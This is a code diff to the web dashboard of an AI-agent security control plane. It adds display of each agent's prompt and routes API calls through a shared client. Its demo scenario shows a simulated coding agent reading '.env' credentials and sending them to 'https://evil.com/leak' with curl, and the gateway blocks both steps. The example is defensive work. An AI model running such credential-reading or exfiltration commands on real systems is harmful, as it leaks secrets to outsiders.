@@ -23,9 +23,22 @@
     .scrollbar-thin::-webkit-scrollbar { width: 6px; height: 6px; }
     .scrollbar-thin::-webkit-scrollbar-track { background: #0f172a; }
     .scrollbar-thin::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+
+    body { background: #eef2f6; }
+    .glow-emerald, .glow-rose { animation: none; }
+    .admin-confirm-dialog { width: min(92vw, 480px); border: 1px solid #cbd5e1; border-radius: 16px; padding: 24px; background: white; color: #172033; box-shadow: 0 24px 80px #0f172a40; font: 16px/1.5 system-ui; }
+    .admin-confirm-dialog::backdrop { background: #0f172a70; }
+    .admin-confirm-dialog h2 { font-size: 21px; font-weight: 700; }
+    .admin-confirm-dialog p { margin: 12px 0; }
+    .admin-confirm-dialog label { display: block; font-weight: 600; }
+    .admin-confirm-dialog input { display: block; width: 100%; border: 1px solid #64748b; padding: 10px; border-radius: 6px; }
+    .admin-confirm-dialog button { margin: 12px 8px 0 0; padding: 10px 16px; border: 1px solid #64748b; border-radius: 6px; }
+    .admin-confirm-dialog button[value="confirm"] { background: #9f1239; color: white; }
+    :focus-visible { outline: 3px solid #2563eb; outline-offset: 3px; }
+    @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation: none !important; transition: none !important; } }
   </style>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen font-sans antialiased flex flex-col overflow-x-hidden">
+<body class="bg-slate-100 text-slate-100 min-h-screen font-sans antialiased flex flex-col overflow-x-hidden">
 
   <!-- TOP HEADER -->
   <header class="border-b border-slate-800 bg-slate-900/90 backdrop-blur sticky top-0 z-30 px-6 py-3">
@@ -347,6 +360,18 @@
           <span class="text-slate-400">Latency: <strong id="flow-duration" class="text-cyan-400">2ms</strong></span>
         </div>
       </div>
+
+      <!-- Active Developer Prompt Banner (CIO Live Observability) -->
+      <div id="flow-prompt-container" class="mt-2 bg-indigo-950/40 border border-indigo-500/30 rounded-xl p-3 flex items-start space-x-3 text-xs">
+        <div class="p-1.5 bg-indigo-500/20 rounded-lg text-indigo-300 font-bold text-sm">💬</div>
+        <div class="flex-1 min-w-0">
+          <div class="flex items-center justify-between">
+            <span class="text-[10px] uppercase font-mono font-bold text-indigo-400 tracking-wider">Active Developer Prompt / Intent (CIO Observability)</span>
+            <span id="flow-prompt-source" class="text-[10px] font-mono text-indigo-300/80">claude-code</span>
+          </div>
+          <p id="flow-prompt-text" class="text-xs font-semibold text-white mt-0.5 truncate">Waiting for developer prompt or tool execution...</p>
+        </div>
+      </div>
     </section>
 
     <!-- MULTI-TAB VIEW (TIMELINE / FLEET / AUDIT CHAIN / CEDAR POLICY) -->
@@ -587,6 +612,12 @@ when {
         <div class="text-slate-400 flex justify-between"><span>Duration:</span> <span id="detail-duration" class="text-emerald-400 font-bold"></span></div>
       </div>
 
+      <!-- User Prompt Block -->
+      <div class="space-y-1">
+        <div class="text-slate-400 font-semibold uppercase text-[10px]">User Prompt / Developer Intent:</div>
+        <div id="detail-prompt" class="p-3 bg-indigo-950/40 rounded-xl border border-indigo-500/40 text-indigo-200 break-words font-sans text-xs"></div>
+      </div>
+
       <!-- Command Block -->
       <div class="space-y-1">
         <div class="text-slate-400 font-semibold uppercase text-[10px]">Full Command Evaluated:</div>
@@ -617,7 +648,10 @@ when {
   </div>
 
   <!-- JAVASCRIPT ENGINE -->
+  <script src="/assets/admin-client.js"></script>
   <script>
+    window.addEventListener("bap-api-error", event => showToast("Action not confirmed", event.detail, "deny"));
+
     // --- BUILT-IN SCENARIOS ---
     const SCENARIOS = {
       "claude-session": [
@@ -625,6 +659,7 @@ when {
           id: "ev-01",
           timestamp: "2026-09-12T20:01:10Z",
           source: "controlplane",
+          user_prompt: "Initialize BAP zero-trust development cockpit",
           category: "AGENT_PRE_REGISTRATION",
           executable: "bapcontrolplane",
           full_command: "POST /api/v1/agents/pre-register (app_id: claude-code-worker)",
@@ -640,6 +675,7 @@ when {
           id: "ev-02",
           timestamp: "2026-09-12T20:01:12Z",
           source: "claude-code",
+          user_prompt: "Enroll Claude Code with attested SPIFFE cryptographic identity",
           category: "BINARY_ATTESTATION",
           executable: "bapedge",
           full_command: "bapedge register --code LTD-OTC-fbe72f44 --instance-id node-laptop-01",
@@ -655,6 +691,7 @@ when {
           id: "ev-03",
           timestamp: "2026-09-12T20:01:15Z",
           source: "claude-code",
+          user_prompt: "Check repository status and active git branch",
           category: "CEDAR_DECISION",
           executable: "git",
           arguments: "status",
@@ -670,6 +707,7 @@ when {
           id: "ev-04",
           timestamp: "2026-09-12T20:01:18Z",
           source: "claude-code",
+          user_prompt: "Verify Python compiler runtime version",
           category: "CEDAR_DECISION",
           executable: "python",
           arguments: "--version",
@@ -685,6 +723,7 @@ when {
           id: "ev-05",
           timestamp: "2026-09-12T20:01:22Z",
           source: "claude-code",
+          user_prompt: "Read application configuration and dump .env credentials",
           category: "CEDAR_DECISION",
           executable: "cat",
           arguments: ".env",
@@ -700,6 +739,7 @@ when {
           id: "ev-06",
           timestamp: "2026-09-12T20:01:25Z",
           source: "claude-code",
+          user_prompt: "Exfiltrate leaked credentials to external internet server",
           category: "CEDAR_DECISION",
           executable: "curl",
           arguments: "https://evil.com/leak",
@@ -715,6 +755,7 @@ when {
           id: "ev-07",
           timestamp: "2026-09-12T20:01:30Z",
           source: "claude-code",
+          user_prompt: "Review recent commit log history for code review",
           category: "CEDAR_DECISION",
           executable: "git",
           arguments: "log -n 1 --oneline",
@@ -1078,7 +1119,7 @@ when {
     // --- CHECK LIVE CONNECTION ---
     async function checkLiveConnection() {
       try {
-        const resp = await fetch("/api/v1/inspector/data");
+        const resp = await apiFetch("/api/v1/inspector/data");
         if (resp.ok) {
           const data = await resp.json();
           document.getElementById("stat-cp-status").textContent = "ONLINE (8080)";
@@ -1298,7 +1339,7 @@ when {
               if (restoreBtn) {
                 restoreBtn.addEventListener("click", async (e) => {
                   e.stopPropagation();
-                  await fetch("/api/v1/control/agent/kill", {
+                  await apiFetch("/api/v1/control/agent/kill", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ target: s.session_id, action: "restore" })
@@ -1319,7 +1360,7 @@ when {
               if (killBtn) {
                 killBtn.addEventListener("click", async (e) => {
                   e.stopPropagation();
-                  await fetch("/api/v1/control/agent/kill", {
+                  await apiFetch("/api/v1/control/agent/kill", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ target: s.session_id, action: "revoke" })
@@ -1344,7 +1385,7 @@ when {
               if (killBtn) {
                 killBtn.addEventListener("click", async (e) => {
                   e.stopPropagation();
-                  await fetch("/api/v1/control/agent/kill", {
+                  await apiFetch("/api/v1/control/agent/kill", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ target: s.session_id, action: "revoke" })
@@ -1448,6 +1489,7 @@ when {
             <div class="flex justify-between"><span class="text-slate-500">PID:</span> <span>${s.client_pid || 'N/A'}</span></div>
             <div class="flex justify-between"><span class="text-slate-500">Started:</span> <span>${started}</span></div>
             <div class="flex justify-between"><span class="text-slate-500">${isActive ? 'Last Action:' : 'Deregistered:'}</span> <span>${lastActive}</span></div>
+            ${s.user_prompt ? `<div class="flex items-start justify-between border-t border-slate-800/80 pt-1 mt-1"><span class="text-slate-500">Prompt:</span> <span class="text-indigo-300 font-semibold text-right max-w-[170px] truncate text-[10px]" title="${escapeHtml(s.user_prompt)}">💬 ${escapeHtml(s.user_prompt)}</span></div>` : ''}
           </div>
 
           <div class="flex items-center justify-between text-[11px] font-mono pt-1">
@@ -1474,7 +1516,7 @@ when {
 
         card.querySelector(".card-kill-btn")?.addEventListener("click", async (e) => {
           e.stopPropagation();
-          await fetch("/api/v1/control/agent/kill", {
+          await apiFetch("/api/v1/control/agent/kill", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ target: s.session_id, action: "revoke" })
@@ -1485,7 +1527,7 @@ when {
 
         card.querySelector(".card-restore-btn")?.addEventListener("click", async (e) => {
           e.stopPropagation();
-          await fetch("/api/v1/control/agent/kill", {
+          await apiFetch("/api/v1/control/agent/kill", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ target: s.session_id, action: "restore" })
@@ -1516,6 +1558,7 @@ when {
           id: id,
           session_id: ev.session_id || "",
           user_id: ev.user_id || "NA",
+          user_prompt: ev.user_prompt || "",
           spiffe_id: ev.spiffe_id || "NA",
           timestamp: ev.timestamp || new Date().toISOString(),
           source: ev.source || "bapcontrolplane",
@@ -1540,6 +1583,7 @@ when {
             id: id,
             session_id: ev.session_id || "",
             user_id: ev.user_id || "NA",
+            user_prompt: ev.user_prompt || "",
             spiffe_id: ev.spiffe_id || "NA",
             timestamp: ev.timestamp || new Date().toISOString(),
             source: ev.source || "bapedge",
@@ -1721,7 +1765,7 @@ when {
       if (btnExecSafe) {
         btnExecSafe.addEventListener("click", async () => {
           try {
-            const resp = await fetch("/api/v1/demo/exec-safe", { method: "POST" });
+            const resp = await apiFetch("/api/v1/demo/exec-safe", { method: "POST" });
             const data = await resp.json();
             if (resp.status === 403 || data.error === "KillSwitchActive") {
               showToast("🚨 EXECUTION BLOCKED BY KILL-SWITCH", "All agent operations are frozen globally by CISO emergency override.", "deny");
@@ -1743,7 +1787,7 @@ when {
       if (btnExecAttack) {
         btnExecAttack.addEventListener("click", async () => {
           try {
-            const resp = await fetch("/api/v1/demo/exec-attack", { method: "POST" });
+            const resp = await apiFetch("/api/v1/demo/exec-attack", { method: "POST" });
             const data = await resp.json();
             triggerAttackAnimation(data);
             showToast("🚨 ROGUE ATTACK BLOCKED BY GATEWAY PEP", "Unauthorized credential exfiltration & egress dropped at perimeter. Target service NEVER reached.", "deny");
@@ -1762,7 +1806,7 @@ when {
         btnToggleScale.addEventListener("click", async () => {
           const target = currentFleetScale === 5 ? 25 : 5;
           try {
-            const resp = await fetch("/api/v1/demo/fleet-scale", {
+            const resp = await apiFetch("/api/v1/demo/fleet-scale", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ count: target })
@@ -1790,10 +1834,10 @@ when {
       if (btnIsolateAgent) {
         btnIsolateAgent.addEventListener("click", async () => {
           try {
-            const resp = await fetch("/api/v1/control/agent/kill", {
+            const resp = await apiFetch("/api/v1/control/agent/kill", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ target: "carol", action: "toggle" })
+              body: JSON.stringify({ target: "sess-laptop-carol", action: allLiveSessions.find(s => s.session_id === "sess-laptop-carol")?.status === "revoked" ? "restore" : "revoke" })
             });
             const data = await resp.json();
             const lbl = document.getElementById("label-isolate-btn");
@@ -1819,7 +1863,7 @@ when {
       const toggleKillAction = async () => {
         const nextState = !isKillSwitchActive;
         try {
-          const resp = await fetch("/api/v1/control/kill-switch", {
+          const resp = await apiFetch("/api/v1/control/kill-switch", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ enabled: nextState })
@@ -1844,7 +1888,7 @@ when {
       if (btnVerifyChainQuick) {
         btnVerifyChainQuick.addEventListener("click", async () => {
           try {
-            const resp = await fetch("/api/v1/control/chain/verify");
+            const resp = await apiFetch("/api/v1/control/chain/verify");
             const data = await resp.json();
             if (data.valid) {
               showToast(
@@ -1940,6 +1984,15 @@ when {
       document.getElementById("flow-duration").textContent = (ev.duration_ms || 1) + "ms";
       document.getElementById("flow-exit-code").textContent = ev.exit_code !== undefined ? ev.exit_code : (isDeny ? 1 : 0);
 
+      const promptEl = document.getElementById("flow-prompt-text");
+      const promptSrc = document.getElementById("flow-prompt-source");
+      if (promptEl) {
+        promptEl.textContent = ev.user_prompt || (isDeny ? "Attempted security-sensitive operation" : "Safe developer toolchain execution");
+      }
+      if (promptSrc) {
+        promptSrc.textContent = ev.source || "claude-code";
+      }
+
       const badge = document.getElementById("flow-decision-badge");
       const statusBanner = document.getElementById("flow-status-banner");
 
@@ -2020,21 +2073,31 @@ when {
           ? "bg-indigo-950/80 text-indigo-300 border border-indigo-700/60 font-semibold" 
           : "bg-slate-800 text-cyan-300 border border-slate-700";
 
+        const promptBadge = ev.user_prompt ? `
+          <div class="mt-1.5 flex items-center space-x-2 text-[11px] font-mono text-indigo-200 bg-indigo-950/70 px-2.5 py-1 rounded-lg border border-indigo-500/40">
+            <span class="text-indigo-400 font-bold">💬 Prompt:</span>
+            <span class="font-medium text-white truncate max-w-xl" title="${escapeHtml(ev.user_prompt)}">"${escapeHtml(ev.user_prompt)}"</span>
+          </div>
+        ` : '';
+
         card.innerHTML = `
-          <div class="flex items-center space-x-2.5 w-full md:w-auto">
-            <span class="font-mono text-slate-500 text-[11px]">#${idx + 1}</span>
-            <span class="px-2 py-0.5 rounded font-bold uppercase text-[10px] border ${badgeClass}">
-              ${ev.decision.toUpperCase()}
-            </span>
-            <span class="px-2 py-0.5 rounded text-[10px] font-mono ${srcBadgeClass}">
-              ${ev.source}
-            </span>
-            ${ev.session_id ? `<span class="px-1.5 py-0.5 rounded text-[9px] font-mono bg-purple-950/80 text-purple-300 border border-purple-800/50 truncate max-w-[130px]" title="${escapeHtml(ev.session_id)}">${escapeHtml(ev.session_id)}</span>` : ''}
-            ${ev.user_id && ev.user_id !== 'NA' ? `<span class="px-1.5 py-0.5 rounded text-[9px] font-mono bg-amber-950/80 text-amber-300 border border-amber-800/50 truncate max-w-[100px]" title="User: ${escapeHtml(ev.user_id)}">👤 ${escapeHtml(ev.user_id)}</span>` : ''}
-            <code class="font-bold text-slate-200 text-sm font-mono truncate max-w-xs md:max-w-md">${escapeHtml(ev.full_command || ev.executable)}</code>
+          <div class="flex-1 min-w-0">
+            <div class="flex flex-wrap items-center space-x-2.5">
+              <span class="font-mono text-slate-500 text-[11px]">#${idx + 1}</span>
+              <span class="px-2 py-0.5 rounded font-bold uppercase text-[10px] border ${badgeClass}">
+                ${ev.decision.toUpperCase()}
+              </span>
+              <span class="px-2 py-0.5 rounded text-[10px] font-mono ${srcBadgeClass}">
+                ${ev.source}
+              </span>
+              ${ev.session_id ? `<span class="px-1.5 py-0.5 rounded text-[9px] font-mono bg-purple-950/80 text-purple-300 border border-purple-800/50 truncate max-w-[130px]" title="${escapeHtml(ev.session_id)}">${escapeHtml(ev.session_id)}</span>` : ''}
+              ${ev.user_id && ev.user_id !== 'NA' ? `<span class="px-1.5 py-0.5 rounded text-[9px] font-mono bg-amber-950/80 text-amber-300 border border-amber-800/50 truncate max-w-[100px]" title="User: ${escapeHtml(ev.user_id)}">👤 ${escapeHtml(ev.user_id)}</span>` : ''}
+              <code class="font-bold text-slate-200 text-sm font-mono truncate max-w-xs md:max-w-md">${escapeHtml(ev.full_command || ev.executable)}</code>
+            </div>
+            ${promptBadge}
           </div>
 
-          <div class="flex items-center space-x-4 text-slate-400 font-mono text-[11px] self-end md:self-auto">
+          <div class="flex items-center space-x-4 text-slate-400 font-mono text-[11px] self-end md:self-auto shrink-0">
             <span>${ev.duration_ms || 1}ms</span>
             <span class="truncate max-w-[200px] text-slate-500">${escapeHtml(ev.reason || "")}</span>
             <button class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-cyan-400 rounded border border-slate-700 text-[10px]">Inspect</button>
@@ -2222,6 +2285,7 @@ when {
       document.getElementById("detail-executable").textContent = ev.executable || "unknown";
       document.getElementById("detail-pid").textContent = ev.client_pid || "24000";
       document.getElementById("detail-duration").textContent = (ev.duration_ms || 1) + "ms";
+      document.getElementById("detail-prompt").textContent = ev.user_prompt || "Not captured or internal toolchain command";
       document.getElementById("detail-command").textContent = ev.full_command || ev.executable;
       document.getElementById("detail-reason").textContent = ev.reason || (isDeny ? "Denied by Cedar policy" : "Permitted by Cedar policy");
       document.getElementById("detail-prev-hash").textContent = ev.prev_hash || "genesis-bapltd-control-plane";
